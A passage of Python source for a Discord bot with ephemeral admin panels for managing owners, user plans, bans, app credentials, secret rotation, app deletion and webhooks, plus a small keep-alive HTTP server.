                yes = discord.ui.Button(label="✓  Confirm", style=discord.ButtonStyle.danger)
                no  = discord.ui.Button(label="✕  Cancel",  style=discord.ButtonStyle.secondary)
                async def yes_cb(yi: discord.Interaction):
                    await owners.delete_one({"uid": target_uid})
                    await yi.response.edit_message(
                        content=(
                            f"**. 花 . ᕫᴣ、{mono('Owner Removed')} . ≧。 . ıl**\n\n{SEP}\n\n"
                            f"✕ . {mono(owner_doc.get('username','—'))} ⌇ removed\n\n"
                            f"-# ⌇ only you can see this"), view=None)
                async def no_cb(ni: discord.Interaction):
                    await ni.response.edit_message(content="-# cancelled", view=None)
                yes.callback=yes_cb; no.callback=no_cb
                conf_view.add_item(yes); conf_view.add_item(no)
                await ri.response.send_message(
                    f"**. 花 . ᕫᴣ、{mono('Remove Owner')} . ≧。 . ıl**\n\n{SEP}\n\n"
                    f"⚠ . {owner_doc.get('username','—')} will lose owner access\n\n"
                    f"-# ⌇ only you can see this",
                    view=conf_view, ephemeral=True)
            rem.callback = rem_cb
            oview.add_item(rem)
            await si.response.send_message(
                f"**. 花 . ᕫᴣ、{mono(owner_doc.get('username','—'))} . ≧。 . ıl**\n\n{SEP}\n\n"
                f"ᯓ★ . {mono('Username')} ⌇ {owner_doc.get('username','—')}\n"
                f"◈  . {mono('Role')}     ⌇ owner\n"
                f"⌇  . {mono('Added')}    ⌇ {owner_doc.get('added','—')[:10]}\n\n"
                f"-# ⌇ only you can see this",
                view=oview, ephemeral=True)
        sel.callback = osel_cb
        add_view.add_item(sel)
        await itr.response.send_message(
            f"**. 花 . ᕫᴣ、{mono('Owner Manage')} . ≧。 . ıl**\n\n{SEP}",
            view=add_view, ephemeral=True)

# ── USER MANAGE VIEW ──────────────────────────────────────────
class UserManageView(discord.ui.View):
    def __init__(self, target_uid: int, target_name: str, caller_uid: int):
        super().__init__(timeout=120)
        tid, tname, cid = target_uid, target_name, caller_uid
        # change plan
        plan_sel = discord.ui.Select(
            placeholder="Change Plan…",
            options=[discord.SelectOption(label=p.capitalize(), value=p) for p in PLANS]
                   +[discord.SelectOption(label="Custom…", value="custom_modal")])
        async def plan_cb(pi: discord.Interaction):
            if pi.user.id != cid:
                await pi.response.send_message(msg_denied("not your panel"), ephemeral=True); return
            val = plan_sel.values[0]
            if val == "custom_modal":
                await pi.response.send_modal(CustomPlanModal(tid, tname))
            else:
                await users.update_one({"uid":tid},{"$set":{"plan":val}},upsert=True)
                tu = await get_user(tid)
                await pi.response.send_message(
                    f"**. 花 . ᕫᴣ、{mono('Plan Updated')} . ≧。 . ıl**\n\n{SEP}\n\n"
                    f"ᯓ★ . {mono('User')} ⌇ {tname}\n"
                    f"◈  . {mono('Plan')} ⌇ {plan_label(tu)}\n\n"
                    f"-# ⌇ only you can see this", ephemeral=True)
        plan_sel.callback = plan_cb
        self.add_item(plan_sel)
        # ban button
        ban_btn = discord.ui.Button(label="⊘  Ban", style=discord.ButtonStyle.danger)
        async def ban_cb(bi: discord.Interaction):
            if bi.user.id != cid:
                await bi.response.send_message(msg_denied("not your panel"), ephemeral=True); return
            conf = discord.ui.View(timeout=60)
            yes  = discord.ui.Button(label="✓  Confirm Ban", style=discord.ButtonStyle.danger)
            no   = discord.ui.Button(label="✕  Cancel",       style=discord.ButtonStyle.secondary)
            async def yes_cb(yi: discord.Interaction):
                await users.update_one({"uid":tid},{"$set":{"banned":True}},upsert=True)
                await yi.response.edit_message(
                    content=(
                        f"**. 花 . ᕫᴣ、{mono('Banned')} . ≧。 . ıl**\n\n{SEP}\n\n"
                        f"⊘ . {tname} ⌇ banned\n\n-# ⌇ only you can see this"),view=None)
            async def no_cb(ni: discord.Interaction):
                await ni.response.edit_message(content="-# cancelled",view=None)
            yes.callback=yes_cb; no.callback=no_cb
            conf.add_item(yes); conf.add_item(no)
            await bi.response.send_message(
                f"**. 花 . ᕫᴣ、{mono('Ban User')} . ≧。 . ıl**\n\n{SEP}\n\n"
                f"⚠ . {tname} will lose all access\n\n-# ⌇ only you can see this",
                view=conf, ephemeral=True)
        ban_btn.callback = ban_cb
        self.add_item(ban_btn)
        # unban button
        unban_btn = discord.ui.Button(label="✓  Unban", style=discord.ButtonStyle.secondary)
        async def unban_cb(ubi: discord.Interaction):
            if ubi.user.id != cid:
                await ubi.response.send_message(msg_denied("not your panel"), ephemeral=True); return
            conf = discord.ui.View(timeout=60)
            yes  = discord.ui.Button(label="✓  Confirm Unban", style=discord.ButtonStyle.secondary)
            no   = discord.ui.Button(label="✕  Cancel",         style=discord.ButtonStyle.danger)
            async def yes_cb(yi: discord.Interaction):
                await users.update_one({"uid":tid},{"$set":{"banned":False}},upsert=True)
                await yi.response.edit_message(
                    content=(
                        f"**. 花 . ᕫᴣ、{mono('Unbanned')} . ≧。 . ıl**\n\n{SEP}\n\n"
                        f"⊕ . {tname} ⌇ access restored\n\n-# ⌇ only you can see this"),view=None)
            async def no_cb(ni: discord.Interaction):
                await ni.response.edit_message(content="-# cancelled",view=None)
            yes.callback=yes_cb; no.callback=no_cb
            conf.add_item(yes); conf.add_item(no)
            await ubi.response.send_message(
                f"**. 花 . ᕫᴣ、{mono('Unban User')} . ≧。 . ıl**\n\n{SEP}\n\n"
                f"⊕ . {tname} will regain access\n\n-# ⌇ only you can see this",
                view=conf, ephemeral=True)
        unban_btn.callback = unban_cb
        self.add_item(unban_btn)

# ── BUTTON INTERACTION HANDLER ────────────────────────────────
@bot.event
async def on_interaction(itr: discord.Interaction):
    if itr.type != discord.InteractionType.component: return
    cid = itr.data.get("custom_id","")
    if ":" not in cid: return
    parts  = cid.split(":")
    action = parts[0]
    if action in ("langsel",): return  # handled by LangSelect
    if len(parts) < 3: return
    app_id = parts[1]
    owner  = int(parts[2])

    if itr.user.id != owner:
        await itr.response.send_message(msg_denied("not your panel"), ephemeral=True); return

    if await check_banned(itr): return

    app = await apps.find_one({"app_id": app_id, "owner": str(owner)})
    if not app:
        await itr.response.send_message(msg_denied(f"{mono('App')} ⌇ not found"), ephemeral=True); return

    panel  = await panels.find_one({"app_id": app_id, "user_id": owner})
    mid    = panel["msg_id"]     if panel else 0
    chid   = panel["channel_id"] if panel else 0

    if action == "cred":
        await itr.response.send_message(
            f"**. 花 . ᕫᴣ、{mono('Credentials')} — {mono(app['name'])} . ≧。 . ıl**\n\n{SEP}\n\n"
            f"⌇  . {mono('Endpoint')} ⌇ {API_ENDPOINT}\n"
            f"◈  . {mono('App ID')}   ⌇ {app['app_id']}\n"
            f"✦  . {mono('Secret')}   ⌇ ||{app['secret']}||\n\n"
            f"-# ⌇ only you can see this", ephemeral=True)

    elif action == "intg":
        await itr.response.send_message(
            f"**. 花 . ᕫᴣ、{mono('Integration Guide')} . ≧。 . ıl**\n\n{SEP}\n\n"
            f"⊹ . select a language",
            view=LangView(app_id, owner), ephemeral=True)

    elif action == "rot":
        conf = discord.ui.View(timeout=60)
        yes  = discord.ui.Button(label="✓  Confirm Rotate", style=discord.ButtonStyle.danger)
        no   = discord.ui.Button(label="✕  Cancel",          style=discord.ButtonStyle.secondary)
        async def yes_cb(yi: discord.Interaction):
            sec = new_secret()
            await apps.update_one({"app_id":app_id},{"$set":{"secret":sec}})
            updated = await apps.find_one({"app_id":app_id})
            await _update_panel(bot, app_id, mid, chid, updated, owner)
            await yi.response.edit_message(
                content=(
                    f"**. 花 . ᕫᴣ、{mono('Secret Rotated')} . ≧。 . ıl**\n\n{SEP}\n\n"
                    f"↻ . {mono('New Secret')} ⌇ ||{sec}||\n\n"
                    f"-# ⌇ old builds are now dead\n-# ⌇ only you can see this"),view=None)
        async def no_cb(ni: discord.Interaction):
            await ni.response.edit_message(content="-# cancelled",view=None)
        yes.callback=yes_cb; no.callback=no_cb
        conf.add_item(yes); conf.add_item(no)
        await itr.response.send_message(
            f"**. 花 . ᕫᴣ、{mono('Rotate Secret')} — {mono(app['name'])} . ≧。 . ıl**\n\n{SEP}\n\n"
            f"⚠ . existing builds will stop working\n"
            f"⚠ . rebuild with new secret required\n\n"
            f"⌇ . {mono('Webhook')} ⌇ preserved\n\n-# ⌇ only you can see this",
            view=conf, ephemeral=True)

    elif action == "ren":
        await itr.response.send_modal(RenameModal(app_id, mid, chid))

    elif action == "del":
        conf = discord.ui.View(timeout=60)
        yes  = discord.ui.Button(label="✓  Confirm Delete", style=discord.ButtonStyle.danger)
        no   = discord.ui.Button(label="✕  Cancel",          style=discord.ButtonStyle.secondary)
        async def yes_cb(yi: discord.Interaction):
            await apps.delete_one({"app_id":app_id})
            await panels.delete_one({"app_id":app_id,"user_id":owner})
            await yi.response.edit_message(
                content=(
                    f"**. 花 . ᕫᴣ、{mono('Deleted')} . ≧。 . ıl**\n\n{SEP}\n\n"
                    f"✕ . {mono(app['name'])} ⌇ removed\n\n-# ⌇ only you can see this"),view=None)
        async def no_cb(ni: discord.Interaction):
            await ni.response.edit_message(content="-# cancelled",view=None)
        yes.callback=yes_cb; no.callback=no_cb
        conf.add_item(yes); conf.add_item(no)
        await itr.response.send_message(
            f"**. 花 . ᕫᴣ、{mono('Delete')} — {mono(app['name'])} . ≧。 . ıl**\n\n{SEP}\n\n"
            f"⚠ . all logs will be removed\n"
            f"⚠ . this action is irreversible\n\n-# ⌇ only you can see this",
            view=conf, ephemeral=True)

    elif action == "wh":
        wview = discord.ui.View(timeout=60)
        set_b = discord.ui.Button(label="✎  Set New Webhook", style=discord.ButtonStyle.secondary)
        async def set_cb(si: discord.Interaction):
            await si.response.send_modal(WebhookModal(app_id, mid, chid))
        set_b.callback = set_cb
        wview.add_item(set_b)
        await itr.response.send_message(
            f"**. 花 . ᕫᴣ、{mono('Webhook')} — {mono(app['name'])} . ≧。 . ıl**\n\n{SEP}\n\n"
            f"◈ . {mono('Current')} ⌇ {mask_webhook(app.get('webhook','—'))}\n\n"
            f"-# ⌇ only you can see this",
            view=wview, ephemeral=True)

# ── KEEP ALIVE — Render port bind ────────────────────────────
class _KA(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
    def log_message(self, *_): pass

def _keep_alive():
    port = int(os.environ.get("PORT", 8080))
    HTTPServer(("0.0.0.0", port), _KA).serve_forever()

threading.Thread(target=_keep_alive, daemon=True).start()

bot.run(BOT_TOKEN)
